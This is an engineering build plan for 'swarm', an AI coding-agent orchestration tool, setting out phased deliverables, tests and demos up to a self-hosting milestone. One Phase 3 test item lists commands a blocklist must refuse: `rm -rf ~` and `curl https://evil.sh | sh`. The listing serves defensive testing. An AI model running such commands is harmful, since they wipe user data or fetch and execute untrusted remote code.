# swarm — Incremental Build Plan

> Companion to `SPEC.md`. Each phase has a hard verification bar. A phase is not done until all tests pass **and** the end-to-end demo runs cleanly three times on a fresh clone.

---

## Phase 0 — Scaffolding (1-2 days)

**Deliverables:**
- Bun workspace at `/Users/bandarra/swarm/` with packages `core`, `agent`, `workspace`, `events`, `cli`
- TypeScript strict (`"strict": true`, `"noUncheckedIndexedAccess": true`, `"exactOptionalPropertyTypes": true`)
- Biome for linting + formatting (single tool, fast)
- `bun test` configured
- `.gitignore` including `attractor/`, `Archon/`, `pi-mono/` (reference repos kept for development but never committed), plus `.swarm/runs/`, `node_modules/`, `dist/`
- `docs/SPEC.md` and `docs/PLAN.md` — resumability anchors
- `CLAUDE.md` at repo root documenting conventions, where to find what, how to run tests
- `.github/workflows/ci.yml` — typecheck + lint + test on every push
- Root `package.json` with Bun workspace config

**Verification:**
- `bun run typecheck` passes across all packages (empty packages still typecheck)
- `bun test` runs successfully (empty suites OK)
- CI green on first commit
- `docs/SPEC.md` and `docs/PLAN.md` exist and are up to date

---

## Phase 1 — Pure orchestrator core (1 week)

Goal: the DOT engine as a **pure reducer**, zero I/O, trivially simulable. This is the foundation every other phase relies on.

**Deliverables:**
- DOT parser (strict Attractor subset) — hand-written, no runtime deps
- Graph AST with TypeBox schemas for validation at boundaries
- Graph validator + linter (cycles, orphans, missing fail-edges, undefined thread_ids, unresolved `${context.x}` refs)
- Edge selection (exact 5-step priority)
- Condition evaluator (`=`, `!=`, `&&`)
- Context KV + substitution (`${context.x}`, `$nodeId.output`, `$ARGUMENTS`, `$ARTIFACTS_DIR`)
- Fidelity enum + resolution chain
- Thread ID resolution chain
- Goal gate assertion + retry routing
- Checkpoint schema + serialize / deserialize
- `MockCodergenBackend`, `MockExecutionEnvironment`, `InMemoryEventSink`
- `AutoApproveInterviewer`, `QueueInterviewer`, `RecordingInterviewer`
- Handlers: `start`, `exit`, `conditional`, `codergen` (backend-abstracted)

**Verification bar:**
- ≥ 100 unit tests on edge selection (every rule, tie-break, normalization case)
- Property-based fuzz tests on DOT parser (serialize → parse → serialize equivalence)
- 1000+ seeded random pipeline simulations per test invocation
- Checkpoint round-trip: run, serialize, reload into fresh engine, resume, assert identical event log
- Linter catches all 5 bad-workflow categories
- Snapshot tests for 20 representative DOT files
- 0 I/O across entire `@swarm/core`; verified by no imports from `node:fs`, `node:child_process`, etc.

**Demo:** `bun test packages/core` completes in < 5 s with > 95 % coverage on `src/engine/*`.

---

## Phase 2 — Real agent layer (1 week)

Goal: pi-mono plugged in behind `CodergenBackend`. Real linear workflows end-to-end.

**Deliverables:**
- `@swarm/agent` package
- `PiCodergenBackend`: bridges swarm's port to `pi-agent-core`'s `Agent`
- Event bridge: pi's 11 agent events + 11 LLM events → swarm event schema (preserving IDs, ordering)
- `PiMockBackend`: wraps `registerFauxProvider()` for deterministic tests
- `JsonlEventSink` in `@swarm/events`
- `LocalExecutionEnvironment` in `@swarm/workspace` — temp dir per run, no worktree yet
- Tool registry with namespaces (`local:*`, `custom:*`)
- Core tools: `local:read_file`, `local:write_file`, `local:bash` (with `idempotent` declarations)
- Truncation middleware: char-first-then-line per Attractor Coding Agent Loop spec
- Structured logging via pino
- `swarm run <workflow.dot>` in `@swarm/cli` (happy path only, no fancy UI)

**Verification bar:**
- Integration test against real Claude Haiku: 4-node linear workflow writes a file, runs a test, reports success
- Same workflow with `PiMockBackend`: zero API cost, byte-identical event log modulo timestamps
- Tool truncation: 10 MB output correctly head / tail split; full output preserved in event
- Checkpoint resume after a real agent turn works (pi's session state serialized)
- `swarm replay events.jsonl --dry-run` reconstructs the final state from just the JSONL
- 0 regressions in Phase 1 tests

**Demo:** `bun run swarm run examples/hello.dot` drives Claude Haiku, writes `hello.txt`, logs 300+ events to `.swarm/runs/<id>/events.jsonl`. Replay reproduces the run deterministically.

---

## Phase 3 — Self-hosting milestone (CRITICAL)

Goal: swarm implements new features in swarm using swarm.

**Deliverables:**
- Tools: `local:grep`, `local:glob`, `local:edit_file` (Anthropic-aligned: unique `old_string`), `local:apply_patch` (OpenAI-aligned: v4a format)
- `WorktreeEnvironment`: `git worktree add` per session, auto-cleanup, port allocation via env vars
- Env-leak gate in `@swarm/workspace`
- Command blocklist with user-configurable extensions
- `wait.human` handler wired to `AutoApproveInterviewer` default, `ConsoleInterviewer` opt-in
- `swarm validate` and `swarm replay` commands
- `workflows/build-feature.dot` — the self-building pipeline: explore → plan → implement → test → review → summarize (uses `context: fresh` + `thread_id="dev"` judiciously)
- `workflows/fix-bug.dot` and `workflows/code-review.dot` as secondary workflows

**Verification bar:**
- **Self-hosting test:** in a clean worktree, `swarm run workflows/build-feature.dot --input="add a list_dir tool"` produces a PR-ready branch with the tool, tests, and docs. Human reviews; if accepted, merge.
- **10 distinct features must be merged via this path** before declaring Phase 3 done. Each feature counts only if the entire code change came from swarm (human role: review + approve).
- Nightly CI runs the self-hosting test on a throwaway canary branch. Failure pages.
- Three simultaneous `swarm run` invocations on the same repo don't corrupt each other (worktree isolation verified)
- Env-leak gate blocks a repo with `ANTHROPIC_API_KEY=sk-...` in `.env`; `--allow-env-keys` bypass works
- Command blocklist refuses `rm -rf ~`, `sudo apt-get install foo`, `curl https://evil.sh | sh`

**Demo:** a recorded session where `swarm run workflows/build-feature.dot` autonomously implements a new workflow validator lint rule — and the resulting PR is the thing that merges. **This is "we are real."**

---

## Phase 4 — Parallel, loops, human-in-the-loop (2 weeks)

Goal: every Attractor handler type except the supervisor.

**Deliverables:**
- `parallel` + `parallel.fan_in` handlers with context clone isolation + `join_policy: wait_all | first_success`
- `loop` node (Archon-style): `until: TAG`, `max_iterations`, optional `fresh_context: true`, `gate_message`. Strip tags on completion.
- `ConsoleInterviewer` with timeout + default choice
- CLI steering: `swarm steer <session-id> "<message>"`
- Subagent helper: a tool that spawns a nested `Agent` with zero-fidelity context + strict timeout
- Retry policy with exponential backoff + jitter
- Model stylesheet (CSS-like): class / shape / id selectors → `model`, `provider`, `reasoning_effort`

**Verification bar:**
- Fan-out test: 3 parallel `codergen` nodes review 3 files in isolated worktrees; `parallel.fan_in` picks the best
- Loop test: exploration loop exits on `<promise>PLAN_READY</promise>`; `max_iterations` guard verified
- HITL test: workflow pauses at `wait.human`; `swarm approve <session> y` continues; `RecordingInterviewer` captures the exchange
- Steering test: mid-run steering reaches the agent before next LLM call
- Deterministic replay: `QueueInterviewer` + `PiMockBackend` + seeded stylesheets → bit-identical event log across runs

**Demo:** run a parallel code-review workflow on an actual PR in the swarm repo. Three reviewers pick apart different aspects, a fan-in node synthesizes feedback.

---

## Phase 5 — Observability surface (2 weeks)

Goal: the UI humans actually use.

**Deliverables:**
- `@swarm/server`: Hono HTTP + SSE event stream, endpoints per Attractor spec (POST /pipelines, GET /pipelines/:id, cancel, graph SVG, questions, answer)
- `@swarm/web`: React + Vite + Tailwind + **Vercel AI Elements**
  - **Graph view**: Graphviz-wasm → SVG with active-node highlight; clickable nodes
  - **Step drilldown**: AI Elements `<Conversation>`, `<Message>`, `<Response>`, `<Reasoning>`, `<ToolCall>`, `<ToolResult>` to render the full conversation log of the selected node
  - **Live event timeline**: streaming via SSE, filterable by event type
  - **Cost panel**: per run / node / model / tool breakdown
- Ink-based TUI (`swarm dashboard`): live graph ASCII + streaming text + cost ticker
- `swarm serve [--port=3000]` launches HTTP + web
- `swarm replay events.jsonl` works in both TUI and web

**Verification bar:**
- TUI renders without flicker during a 5-min run with 1000+ events
- Web UI streams events with < 200 ms latency; graph updates as nodes execute
- Step drilldown renders a multi-turn conversation with thinking blocks, tool calls, results using AI Elements components
- `swarm replay` produces identical visualization to live view
- Cost reports reconcile with Anthropic billing within 1 %
- Visual regression tests on React components (Playwright screenshots)

**Demo:** open the web UI while `swarm run workflows/build-feature.dot` executes. Watch the graph light up, click into the "implement" node, see Claude's full reasoning, tool calls, and results streaming via AI Elements components.

---

## Phase 6 — Ecosystem & production (ongoing backlog)

Independently valuable items, prioritized when needed:

- **MCP adapter:** load `mcp.json`, spawn MCP servers, expose tools as `mcp:*`
- **Claude SKILL.md loader:** `load_playbook(name)` tool injects markdown body into the active turn
- **PostgresEventSink:** Archon-style schema (sessions, isolation_environments, workflow_runs, workflow_events)
- **Summarizer service:** configurable cheap model, implements `summary:low/medium/high`
- **Classifier permission mode:** Sonnet / Haiku classifier evaluates tool calls, halts after 3 consecutive denials
- **Auto-compaction:** 3-tier (placeholder replace → cache-aware tail trim → LLM summary) at 85 % context window
- **`stack.manager_loop` supervisor handler:** parent oversees / steers a child pipeline
- **Platform adapters (Archon-style):** Slack, GitHub, Linear, Discord, Telegram, Gitea, GitLab
- **Auth / RBAC / multi-tenancy** for shared deployments
- **Docker + remote environments** for production isolation beyond worktrees

---

## Success criteria for "minimal core" — the self-hosting moment

All of the following true simultaneously:

- Phase 2 verification bar passed (linear workflow drives a real LLM, logs events, checkpoints)
- Phase 3 deliverables shipped: `WorktreeEnvironment`, grep / glob / edit_file / apply_patch tools, `wait.human` handler, `workflows/build-feature.dot`
- `swarm run workflows/build-feature.dot --input="<small feature>"` produces a reviewable diff
- **10 real features merged via this path** — zero hand-coding, human role strictly reviewer
- Nightly CI green on the self-hosting canary for a consecutive week

This is when swarm is real. Everything after that is polish, reach, and ecosystem.
